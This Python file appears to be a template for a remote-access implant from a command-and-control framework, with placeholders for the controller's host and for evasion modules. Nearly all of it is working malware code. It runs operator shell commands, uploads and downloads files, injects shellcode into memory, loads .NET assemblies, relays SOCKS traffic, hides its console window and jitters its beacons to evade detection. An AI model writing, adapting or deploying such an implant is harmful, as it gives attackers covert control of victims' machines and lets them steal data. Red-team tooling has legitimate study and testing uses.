#!/usr/bin/env python3
import asyncio
import websockets
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys

import random as _rjit
import time as _tjit
_tjit.sleep(_rjit.uniform(0.5, 5.0))

{{EVASION_AMSI}}
{{EVASION_ETW}}
{{EVASION_SYSCALLS}}
{{EVASION_INJECT}}
{{EVASION_BOF}}


SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
RECONNECT_DELAY = 5
BEACON_MODE = {{BEACON_MODE}}
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}  # Percentage (0-100)


{{EVASION_CRYPTO}}

def _derive_aes_key(key):
    import hashlib
    return hashlib.sha256(key).digest()

def simple_encrypt(data: str) -> str:
    return wire_encrypt(data)

def simple_decrypt(data: str) -> str:
    return wire_decrypt(data)

async def stealth_sleep(seconds):
    secret = bytearray(globals().get('ENCRYPTION_KEY', b'sockpuppets-sleep-mask'))
    try:
        globals()['sleep_encrypt'](0, secret)
    except Exception:
        pass
    await sleep_mask(seconds)

async def sleep_mask(seconds):
    import os
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    src = b'sockpuppets-sleep-mask'
    try:
        key = os.urandom(32)
        nonce = os.urandom(12)
        ct = AESGCM(key).encrypt(nonce, src, b'sockpuppets-sleep-mask-v1')
    except Exception:
        await asyncio.sleep(seconds)
        return
    await asyncio.sleep(seconds)
    try:
        AESGCM(key).decrypt(nonce, ct, b'sockpuppets-sleep-mask-v1')
    except Exception:
        pass


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    """Calculate sleep time with jitter applied"""
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)

    import random
    # Calculate jitter range: interval ± (interval * jitter / 100)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount

    # Return random value within range
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    """Gather system metadata"""
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def _handle_fs(command: str) -> str:
    if command.startswith('__fs:ls:'):
        path = command[8:] or '.'
        try:
            entries = []
            for name in os.listdir(path):
                full = os.path.join(path, name)
                try:
                    st = os.stat(full)
                    prefix = 'd' if os.path.isdir(full) else '-'
                    entries.append(f"{prefix} {st.st_size:>12}  {name}")
                except OSError:
                    entries.append(f"? {'?':>12}  {name}")
            return '\n'.join(entries) if entries else 'Directory is empty'
        except Exception as e:
            return f"Error: {e}"
    if command.startswith('__fs:get:'):
        path = command[9:]
        if not os.path.isfile(path):
            return 'Error: not a file'
        if os.path.getsize(path) > 2 * 1024 * 1024:
            return 'Error: file too large (>2MB)'
        return 'FILE:' + base64.b64encode(open(path, 'rb').read()).decode()
    if command.startswith('__fs:put:'):
        rest = command[9:]
        path, _, b64 = rest.partition('\t')
        data = base64.b64decode(b64)
        parent = os.path.dirname(path)
        if parent:
            os.makedirs(parent, exist_ok=True)
        with open(path, 'wb') as f:
            f.write(data)
        return f'uploaded {len(data)} bytes to {path}'
    return 'Error: unknown fs command'


def _handle_bof(command: str) -> str:
    parts = command.split(':', 3)
    if len(parts) < 4:
        return 'Error: invalid BOF format (expected __bof:entry:args_b64:bof_data)'
    entry = parts[1]
    args_b64 = parts[2]
    bof_b64 = parts[3]
    try:
        bof_data = base64.b64decode(bof_b64)
        args_data = base64.b64decode(args_b64) if args_b64 else b''
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if sys.platform != 'win32':
        return f'BOF received: {len(bof_data)} bytes, entry={entry}, args={len(args_data)} bytes (not Windows, skipping execution)'
    try:
        import ctypes, tempfile
        tmp = tempfile.NamedTemporaryFile(suffix='.bin', delete=False)
        tmp.write(bof_data)
        tmp.close()
        try:
            lib = ctypes.CDLL(tmp.name)
            func = getattr(lib, entry, None)
            if func:
                func()
                result = f'BOF executed: entry={entry}, size={len(bof_data)} bytes'
            else:
                result = f'BOF loaded but entry "{entry}" not found (available: COFF object)'
        except OSError as e:
            result = f'BOF load error (expected for raw COFF): {e}'
        finally:
            os.unlink(tmp.name)
        return result
    except Exception as e:
        return f'BOF error: {e}'


def _handle_shinject(command: str) -> str:
    import ctypes, threading
    sc_b64 = command.split(':', 1)[1] if ':' in command else ''
    try:
        sc = base64.b64decode(sc_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not sc:
        return 'Error: empty shellcode'
    try:
        if sys.platform == 'win32':
            k32 = ctypes.windll.kernel32
            ptr = k32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
            if not ptr:
                return 'Error: VirtualAlloc failed'
            ctypes.memmove(ptr, sc, len(sc))
            ht = k32.CreateThread(0, 0, ptr, 0, 0, 0)
            if not ht:
                return 'Error: CreateThread failed'
            return f'Shellcode injected: {len(sc)} bytes, thread handle={ht}'
        else:
            import mmap
            mm = mmap.mmap(-1, len(sc), prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            mm.write(sc)
            cfunc = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mm)))
            t = threading.Thread(target=cfunc)
            t.daemon = True
            t.start()
            return f'Shellcode injected: {len(sc)} bytes (Linux/mmap)'
    except Exception as e:
        return f'Shellcode injection error: {e}'


def _handle_asm(command: str) -> str:
    if sys.platform != 'win32':
        return 'Error: execute-assembly is Windows-only'
    parts = command.split(':', 2)
    args_str = parts[1] if len(parts) > 1 else ''
    asm_b64 = parts[2] if len(parts) > 2 else ''
    try:
        asm_data = base64.b64decode(asm_b64)
    except Exception as e:
        return f'Error: base64 decode failed: {e}'
    if not asm_data:
        return 'Error: empty assembly'
    try:
        import clr
        import System
        from System.Reflection import Assembly
        asm_bytes = System.Array[System.Byte](asm_data)
        assembly = Assembly.Load(asm_bytes)
        entry = assembly.EntryPoint
        if not entry:
            return 'Error: assembly has no entry point'
        argv = args_str.split() if args_str else []
        params = entry.GetParameters()
        if len(params) == 1:
            args_array = System.Array[System.String](argv)
            result = entry.Invoke(None, System.Array[System.Object]([args_array]))
        else:
            result = entry.Invoke(None, None)
        return f'Assembly executed: {result}' if result else 'Assembly executed (no output)'
    except ImportError:
        return f'Error: execute-assembly requires pythonnet (clr module). Assembly received: {len(asm_data)} bytes'
    except Exception as e:
        return f'Assembly execution error: {e}'


def execute_command(command: str) -> str:
    if str(command).startswith('__hd:'):
        return hidden_desktop(command)
    if str(command).startswith('__px:'):
        return postex(command)
    if str(command).startswith('__fs:'):
        return _handle_fs(command)
    if str(command).startswith('__bof:'):
        return _handle_bof(command)
    if str(command).startswith('__shinject:'):
        return _handle_shinject(command)
    if str(command).startswith('__asm:'):
        return _handle_asm(command)
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"
        if sys.platform == 'win32':
            CREATE_NO_WINDOW = 0x08000000
            parts = command.split()
            try:
                result = subprocess.run(parts, capture_output=True, text=True,
                                         timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
                output = result.stdout + result.stderr
                if output.strip():
                    return output
            except (FileNotFoundError, OSError):
                pass
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd(), creationflags=CREATE_NO_WINDOW)
        else:
            result = subprocess.run(command, shell=True, capture_output=True, text=True,
                                     timeout=30, cwd=os.getcwd())
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


async def heartbeat(websocket):
    """Send periodic heartbeat"""
    while True:
        try:
            message = {'type': 'heartbeat'}
            encrypted = simple_encrypt(json.dumps(message))
            await websocket.send(encrypted)
            await asyncio.sleep(10)
        except:
            break


async def socks_proxy_handler(websocket, host: str, port: int):
    """Handle SOCKS proxy connection"""
    try:
        reader, writer = await asyncio.open_connection(host, port)

        async def relay_to_server():
            try:
                while True:
                    data = await reader.read(4096)
                    if not data:
                        break
                    msg = {
                        'type': 'socks_data',
                        'data': base64.b64encode(data).decode()
                    }
                    encrypted = simple_encrypt(json.dumps(msg))
                    await websocket.send(encrypted)
            except:
                pass

        return relay_to_server, writer

    except Exception as e:
        return None, None


WS_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Origin': f'http://{SERVER_HOST}',
}

{{TRANSPORT_BLOCK}}


async def connect_to_server():
    """Main agent connection loop"""
    uri = f"ws://{SERVER_HOST}:{SERVER_PORT}"
    socks_relay_task = None
    socks_writer = None
    current_mode = 'beacon' if BEACON_MODE else 'streaming'
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None  # Persist agent_id across beacon cycles
    pending_results = []  # Store command results for next checkin
    pending_commands = []  # Store commands to execute offline

    while True:
        try:
            _ws_kw = {}
            try:
                import inspect as _inspect
                if 'additional_headers' in _inspect.signature(websockets.connect).parameters:
                    _ws_kw['additional_headers'] = WS_HEADERS
                else:
                    _ws_kw['extra_headers'] = WS_HEADERS
            except Exception:
                _ws_kw['extra_headers'] = WS_HEADERS
            async with websockets.connect(uri, max_size=10485760, **_ws_kw) as websocket:
                metadata = get_metadata()
                metadata['mode'] = current_mode
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter

                # Use checkin if we already have an agent_id, otherwise register
                if agent_id:
                    checkin_msg = {
                        'type': 'checkin',
                        'agent_id': agent_id,
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(checkin_msg))
                else:
                    register_msg = {
                        'type': 'register',
                        'metadata': metadata
                    }
                    encrypted = simple_encrypt(json.dumps(register_msg))

                await websocket.send(encrypted)

                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)

                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    # Always update agent_id if server sends one (handles server restart case)
                    new_id = reg_data.get('agent_id')
                    if new_id and new_id != agent_id:
                        agent_id = new_id
                    {{KEY_DERIVATION}}
                    heartbeat_task = None

                    if current_mode == 'streaming':
                        heartbeat_task = asyncio.create_task(heartbeat(websocket))

                    # Beacon mode: send results AFTER getting ack, then fetch commands
                    if current_mode == 'beacon':
                        # Wait a moment for command to be queued
                        await asyncio.sleep(0.1)

                        # Step 1: Send any pending results from previous cycle
                        if pending_results:
                            for result in pending_results:
                                try:
                                    encrypted_response = simple_encrypt(json.dumps(result))
                                    await websocket.send(encrypted_response)
                                except Exception:
                                    pass
                            pending_results.clear()

                        # Step 2: Fetch all queued commands (non-blocking)
                        pending_commands.clear()
                        while True:
                            try:
                                message = await asyncio.wait_for(websocket.recv(), timeout=2.0)
                                decrypted = simple_decrypt(message)
                                data = json.loads(decrypted)

                                if data.get('type') == 'command':
                                    # Store command for offline execution
                                    pending_commands.append({
                                        'command': data.get('command', ''),
                                        'timestamp': data.get('timestamp', '')
                                    })

                                elif data.get('type') == '__bof__':
                                    pending_commands.append({
                                        'command': '__bof__',
                                        'bof_data': data,
                                        'timestamp': data.get('timestamp', '')
                                    })

                                elif data.get('type') == 'set_interval':
                                    beacon_interval = data.get('interval', beacon_interval)

                                elif data.get('type') == 'kill':
                                    # Exit agent
                                    import sys
                                    sys.exit(0)

                                elif data.get('type') == 'upgrade_mode':
                                    current_mode = 'streaming'
                                    # Start heartbeat for streaming mode
                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))
                                    mode_msg = {
                                        'type': 'mode_change',
                                        'mode': 'streaming'
                                    }
                                    encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                    await websocket.send(encrypted_msg)
                                    # Don't break - fall through to streaming mode
                                    pending_commands.clear()
                                    break

                            except asyncio.TimeoutError:
                                # No more commands, proceed to disconnect
                                break

                        # Step 3: If still in beacon mode, execute commands offline
                        if current_mode == 'beacon':
                            # Execute all commands during sleep period
                            for cmd_data in pending_commands:
                                try:
                                    if cmd_data.get('command') == '__bof__':
                                        try:
                                            output = handle_bof(cmd_data['bof_data'])
                                        except NameError:
                                            output = 'BOF loader not enabled in this agent'
                                    else:
                                        output = execute_command(cmd_data['command'])
                                    # Store result for next checkin
                                    pending_results.append({
                                        'type': 'response',
                                        'output': output,
                                        'command': cmd_data['command'],
                                        'timestamp': cmd_data['timestamp']
                                    })
                                except Exception as e:
                                    pending_results.append({
                                        'type': 'response',
                                        'output': f"Error executing command: {str(e)}",
                                        'command': cmd_data['command'],
                                        'timestamp': cmd_data['timestamp']
                                    })

                            # Sleep for beacon interval (with jitter)
                            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
                            # Evasion: encrypt memory during sleep if enabled
                            {{EVASION_SLEEP}}
                            await stealth_sleep(sleep_time)
                            continue

                        # If we upgraded to streaming, don't disconnect - continue to streaming loop

                    # Streaming mode: maintain persistent connection
                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)

                            if data.get('type') == 'command':
                                command = data.get('command', '')
                                output = execute_command(command)

                                response = {
                                    'type': 'response',
                                    'output': output,
                                    'command': command
                                }
                                encrypted_response = simple_encrypt(json.dumps(response))
                                await websocket.send(encrypted_response)

                            elif data.get('type') == '__bof__':
                                try:
                                    output = handle_bof(data)
                                except NameError:
                                    output = 'BOF loader not enabled in this agent'

                                response = {
                                    'type': 'response',
                                    'output': output
                                }
                                encrypted_response = simple_encrypt(json.dumps(response))
                                await websocket.send(encrypted_response)

                            elif data.get('type') == 'set_interval':
                                beacon_interval = data.get('interval', beacon_interval)

                            elif data.get('type') == 'kill':
                                # Exit agent
                                import sys
                                sys.exit(0)

                            elif data.get('type') == 'upgrade_mode':
                                current_mode = 'streaming'
                                if heartbeat_task is None:
                                    heartbeat_task = asyncio.create_task(heartbeat(websocket))

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'streaming'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)

                            elif data.get('type') == 'downgrade_mode':
                                current_mode = 'beacon'
                                beacon_interval = data.get('interval', beacon_interval)
                                if heartbeat_task:
                                    heartbeat_task.cancel()
                                    heartbeat_task = None

                                mode_msg = {
                                    'type': 'mode_change',
                                    'mode': 'beacon'
                                }
                                encrypted_msg = simple_encrypt(json.dumps(mode_msg))
                                await websocket.send(encrypted_msg)
                                # Break out to beacon mode
                                break

                            elif data.get('type') == 'socks_init':
                                pass

                            elif data.get('type') == 'socks_connect':
                                host = data.get('host')
                                port = data.get('port')
                                relay_coro, socks_writer = await socks_proxy_handler(websocket, host, port)
                                if relay_coro:
                                    socks_relay_task = asyncio.create_task(relay_coro())

                            elif data.get('type') == 'socks_send':
                                if socks_writer:
                                    socks_data = base64.b64decode(data.get('data', ''))
                                    socks_writer.write(socks_data)
                                    await socks_writer.drain()

                        except Exception as e:
                            pass

                    if heartbeat_task:
                        heartbeat_task.cancel()
                    if socks_relay_task:
                        socks_relay_task.cancel()
                    if socks_writer:
                        socks_writer.close()
                        await socks_writer.wait_closed()

        except Exception as e:
            pass

        # Reconnect delay for streaming or on error
        if current_mode == 'streaming':
            await asyncio.sleep(RECONNECT_DELAY)


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass

    while True:
        try:
            asyncio.run(connect_to_server())
            break
        except KeyboardInterrupt:
            break
        except Exception:
            time.sleep(10)
